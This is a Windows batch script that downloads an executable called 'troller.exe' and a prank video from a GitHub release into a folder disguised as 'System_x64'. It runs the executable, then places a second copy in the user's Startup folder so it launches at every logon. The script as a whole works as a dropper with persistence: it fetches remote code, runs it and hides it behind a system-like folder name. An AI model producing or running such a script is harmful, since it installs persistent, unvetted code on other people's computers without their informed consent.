@echo off
set DOWNLOAD_FOLDER=%userprofile%\System_x64
set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

:: create download folder if it doesn't exist
if not exist "%DOWNLOAD_FOLDER%" (
    mkdir "%DOWNLOAD_FOLDER%"
)

:: download the executable and the video file to System_x64 folder
echo Downloading troller.exe to System_x64 folder...
curl -L "https://github.com/vexnity/troller-revamped/releases/download/new/main.exe" -o "%DOWNLOAD_FOLDER%\troller.exe"
if %errorlevel% neq 0 (
    echo Failed to download troller.exe to %DOWNLOAD_FOLDER%.
    exit /b 1
)

echo Downloading troll in suit.mp4 to System_x64 folder...
curl -L "https://github.com/vexnity/troller-revamped/releases/download/Release/troll_in_suit.mp4" -o "%DOWNLOAD_FOLDER%\troll in suit.mp4"
if %errorlevel% neq 0 (
    echo Failed to download troll in suit.mp4 to %DOWNLOAD_FOLDER%.
    exit /b 1
)

:: check if the files are downloaded
if exist "%DOWNLOAD_FOLDER%\troller.exe" (
    echo troller.exe downloaded successfully to %DOWNLOAD_FOLDER%.
) else (
    echo Failed to download troller.exe.
    exit /b 1
)

if exist "%DOWNLOAD_FOLDER%\troll in suit.mp4" (
    echo troll in suit.mp4 downloaded successfully to %DOWNLOAD_FOLDER%.
) else (
    echo Failed to download troll in suit.mp4.
    exit /b 1
)

:: run the executable normally
echo Running troller.exe...
"%DOWNLOAD_FOLDER%\troller.exe"

:: check if the process started
echo Waiting for troller.exe to start...
timeout /t 5 /nobreak

tasklist /fi "imagename eq troller.exe"

:: download a fresh copy of the executable directly to the Startup folder
echo Downloading troller.exe directly to the Startup folder...
curl -L "https://github.com/vexnity/troller-revamped/releases/download/new/main.exe" -o "%STARTUP_FOLDER%\troller.exe"
if %errorlevel% neq 0 (
    echo Failed to download troller.exe to the Startup folder.
    exit /b 1
)

echo Files have been moved to System_x64 folder, troller.exe started, and fresh executable downloaded to Startup folder.
pause
